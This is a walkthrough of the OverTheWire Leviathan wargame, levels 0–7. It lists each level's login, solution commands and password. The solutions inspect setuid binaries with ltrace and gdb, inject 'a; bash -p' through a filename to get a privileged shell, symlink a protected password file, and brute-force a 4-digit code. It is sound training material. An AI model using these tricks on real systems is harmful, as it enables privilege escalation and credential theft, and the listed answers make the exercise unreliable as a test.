# Leviathan

##  Level 0
Connect: ```ssh leviathan0@leviathan.labs.overthewire.org  -p 2223```      
Password: ```leviathan0```

Problem:
- There is no information for this level, intentionally.

Solution:
```
ls -a
>>> .  ..  .backup .bash_logout  .bashrc  .profile

cd ~/.backup
cat bookmarks.html | grep password
```

Output:
```
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```


---


##  Level 0 → Level 1
Connect: ```ssh leviathan1@leviathan.labs.overthewire.org  -p 2223```      
Password: ```rioGegei8m```

Problem:
- There is no information for this level, intentionally.

Solution:
```
ls 
>>> check
```
```
ltrace ./check
>>>
__libc_start_main(0x804853b, 1, 0xffffd724, 0x8048610 <unfinished ...>
printf("password: ")                                       = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: q
)                      = 113
getchar(1, 0, 0x65766f6c, 0x646f6700)                      = 10
getchar(1, 0, 0x65766f6c, 0x646f6700q
)                      = 113
strcmp("q\nq", "sex")                                      = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                      = 29
+++ exited (status 0) +++
<<<
```
```
./check
>>> password: sex

vim /etc/leviathan_pass/leviathan2
```

Attempt:
```
strings ./check
mkdir /tmp/<username>
objdump -d check > /tmp/<username>/check.asm
objdump -M intel -d check > /tmp/<username>/check.asm
vim /tmp/<username>/check.asm
```

Output:
```
ougahZi8Ta
```


---


##  Level 1 → Level 2
Connect: ```ssh leviathan2@leviathan.labs.overthewire.org  -p 2223```      
Password: ```ougahZi8Ta```

Problem:
- There is no information for this level, intentionally.

Solution:
```
ls 
>>> printfile

mkdir /tmp/<username>
cd /tmp/<username>
touch "a; bash -p"

~/printfile "a; bash -p"
>>> switched to leviathan3@leviathan

vim /etc/leviathan_pass/leviathan3
```

Helpful Links:
* https://en.wikipedia.org/wiki/Code_injection
* https://linux.die.net/man/1/bash
* If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.

Attempt:
```
whoami
>>> leviathan2

groups
>>> leviathan2

ls -l
>>> total 8
>>> -r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26 2019 printfile

ls -l /tmp/sallycolly
>>> total 16
>>> -rw-r--r-- 1 leviathan1 root 13077 Dec 31 20:30 check.asm
```
```
ls -l /etc/leviathan_pass/
>>>
total 32
-r-------- 1 leviathan0 leviathan0 11 Aug 26  2019 leviathan0
-r-------- 1 leviathan1 leviathan1 11 Aug 26  2019 leviathan1
-r-------- 1 leviathan2 leviathan2 11 Aug 26  2019 leviathan2
-r-------- 1 leviathan3 leviathan3 11 Aug 26  2019 leviathan3
-r-------- 1 leviathan4 leviathan4 11 Aug 26  2019 leviathan4
-r-------- 1 leviathan5 leviathan5 11 Aug 26  2019 leviathan5
-r-------- 1 leviathan6 leviathan6 11 Aug 26  2019 leviathan6
-r-------- 1 leviathan7 leviathan7 11 Aug 26  2019 leviathan7
<<<
```
```
ltrace ./printfile /etc/leviathan_pass/leviathan2
>>>
__libc_start_main(0x804852b, 2, 0xffffd714, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                                   = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
geteuid()                                                                     = 12002
geteuid()                                                                     = 12002
setreuid(12002, 12002)                                                        = 0
system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                        = 0
+++ exited (status 0) +++
<<<
```
```
ltrace ./printfile /etc/leviathan_pass/leviathan3
>>>
__libc_start_main(0x804852b, 2, 0xffffd6f4, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                = -1
puts("You cant have that file..."You cant have that file...
)                         = 27
+++ exited (status 1) +++
<<<
```
```
gdb ./printfile
(gdb) set disassembly-flavor intel

(gdb) disass main
Dump of assembler code for function main:
   0x0804852b <+0>:	lea    ecx,[esp+0x4]
   0x0804852f <+4>:	and    esp,0xfffffff0
   0x08048532 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048535 <+10>:	push   ebp
   0x08048536 <+11>:	mov    ebp,esp
   0x08048538 <+13>:	push   ebx
   0x08048539 <+14>:	push   ecx
   0x0804853a <+15>:	sub    esp,0x200
   0x08048540 <+21>:	mov    ebx,ecx
   0x08048542 <+23>:	cmp    DWORD PTR [ebx],0x1
   0x08048545 <+26>:	jg     0x8048577 <main+76>
   0x08048547 <+28>:	sub    esp,0xc
   0x0804854a <+31>:	push   0x8048690
   0x0804854f <+36>:	call   0x80483c0 <puts@plt>
   0x08048554 <+41>:	add    esp,0x10
   0x08048557 <+44>:	mov    eax,DWORD PTR [ebx+0x4]
   0x0804855a <+47>:	mov    eax,DWORD PTR [eax]
   0x0804855c <+49>:	sub    esp,0x8
   0x0804855f <+52>:	push   eax
   0x08048560 <+53>:	push   0x80486a5
   0x08048565 <+58>:	call   0x80483a0 <printf@plt>
   0x0804856a <+63>:	add    esp,0x10
   0x0804856d <+66>:	mov    eax,0xffffffff
   
(gdb) b *main
Breakpoint 1 at 0x804852b

(gdb) run
Starting program: /home/leviathan2/printfile
Breakpoint 1, 0x0804852b in main ()

(gdb) info registers
eax            0xf7fc6dbc	-134451780
ecx            0x9e7287df	-1636661281
edx            0xffffd694	-10604
ebx            0x0	0
esp            0xffffd66c	0xffffd66c
ebp            0x0	0x0
esi            0x1	1
edi            0xf7fc5000	-134459392
eip            0x804852b	0x804852b <main>
eflags         0x292	[ AF SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

Output:
```
Ahdiemoo1j
```


---


##  Level 2 → Level 3
Connect: ```ssh leviathan3@leviathan.labs.overthewire.org  -p 2223```      
Password: ```Ahdiemoo1j```

Problem:
- There is no information for this level, intentionally.

Solution:
```
ls 
>>> level3

./level3
>>> Enter the password> asdf
>>> bzzzzzzzzap. WRONG
```
```
ltrace ./level3
>>>
__libc_start_main(0x8048618, 1, 0xffffd744, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                        = -1
printf("Enter the password> ")                                    = 20
fgets(Enter the password> asdf
"asdf\n", 256, 0xf7fc55a0)                                  = 0xffffd550
strcmp("asdf\n", "snlprintf\n")                                   = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                        = 19
+++ exited (status 0) +++
<<<
```
```
./level3
>>>
Enter the password> snlprintf
[You've got shell]!
$ ls
level3
$ whoami
leviathan4
$ vim /etc/leviathan_pass/leviathan4
<<<
```

Output:
```
vuH0coox6m
```


---


##  Level 3 → Level 4
Connect: ```ssh leviathan4@leviathan.labs.overthewire.org  -p 2223```      
Password: ```vuH0coox6m```

Problem:
- There is no information for this level, intentionally.

Solution:
```
ls -a
>>> .  ..  .bash_logout  .bashrc  .profile  .trash

vim ~/.trash/bin
>>> 01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010

# convert binary to ascii using converter below to get password
```

Helpful Links:
* https://www.rapidtables.com/convert/number/binary-to-ascii.html

Output:
```
Tith4cokei
```


---


##  Level 4 → Level 5
Connect: ```ssh leviathan5@leviathan.labs.overthewire.org  -p 2223```      
Password: ```Tith4cokei```

Problem:
- There is no information for this level, intentionally.

Solution:
```
ls -l
>>> total 8
>>> -r-sr-x--- 1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
```
```
ltrace ./leviathan5 
>>>
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 
fopen("/tmp/file.log", "r")                  = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)            = 26
exit(-1 
+++ exited (status 255) +++
<<<
```
```
mkdir /tmp/file.log
ltrace ./leviathan5 
>>> PRINTS A LOT OF GIBBERISH NONSTOP

^C
 
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
```

Output:
```
UgaoFee4li
```


---


##  Level 5 → Level 6
Connect: ```ssh leviathan6@leviathan.labs.overthewire.org  -p 2223```      
Password: ```UgaoFee4li```

Problem:
- There is no information for this level, intentionally.

Solution:
```
ls 
>>> leviathan6

./leviathan6
>>> usage: ./leviathan6 <4 digit code>

./leviathan6 1234
>>> Wrong
```
```
ltrace ./leviathan6 1234
>>>
__libc_start_main(0x804853b, 2, 0xffffd724, 0x80485e0 <unfinished ...>
atoi(0xffffd86a, 0, 0xf7e40890, 0x804862b)                       = 1234
puts("Wrong"Wrong
)                                                    = 6
+++ exited (status 0) +++
<<<
```
```
# Okay let's just brute force this
for i in $(seq -f "%04g" 0 9999); do echo $i; ~/leviathan6 $i; done
>>>
...
Wrong
7119
Wrong
7120
Wrong
7121
Wrong
7122
Wrong
7123
$ whoami
leviathan7
<<<
```
```
vim /etc/leviathan_pass/leviathan7
```

Output:
```
ahy7MaeBo9
```


---


##  Level 6 → Level 7
Connect: ```ssh leviathan7@leviathan.labs.overthewire.org  -p 2223```      
Password: ```ahy7MaeBo9```

Problem:
- There is no information for this level, intentionally.

Solution:
```
vim CONGRATULATIONS
```

Output:
```
Well Done, you seem to have used a *nix system before, now try something more serious.
```


